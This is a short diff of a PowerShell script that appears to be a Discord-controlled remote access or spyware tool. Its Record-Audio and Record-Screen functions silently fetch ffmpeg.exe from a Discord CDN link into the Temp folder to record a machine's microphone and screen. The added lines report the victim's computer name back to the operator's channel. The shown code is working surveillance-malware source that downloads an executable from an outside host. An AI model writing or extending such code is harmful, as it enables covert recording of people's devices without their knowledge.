@@ -230,6 +230,8 @@ Function Record-Audio{
 param ([int[]]$t)
 $Path = "$env:Temp\ffmpeg.exe"
 If (!(Test-Path $Path)){  
+$contents = "$comp $env:COMPUTERNAME $comp Downloading ffmpeg.exe to client.."
+Post-Message | Out-Null
 $url = "https://cdn.discordapp.com/attachments/803285521908236328/1089995848223555764/ffmpeg.exe"
 iwr -Uri $url -OutFile $Path
 }
@@ -249,7 +251,9 @@ rm -Path $filePath -Force
 Function Record-Screen{
 param ([int[]]$t)
 $Path = "$env:Temp\ffmpeg.exe"
-If (!(Test-Path $Path)){  
+If (!(Test-Path $Path)){
+$contents = "$comp $env:COMPUTERNAME $comp Downloading ffmpeg.exe to client.."
+Post-Message | Out-Null
 $url = "https://cdn.discordapp.com/attachments/803285521908236328/1089995848223555764/ffmpeg.exe"
 iwr -Uri $url -OutFile $Path
 }
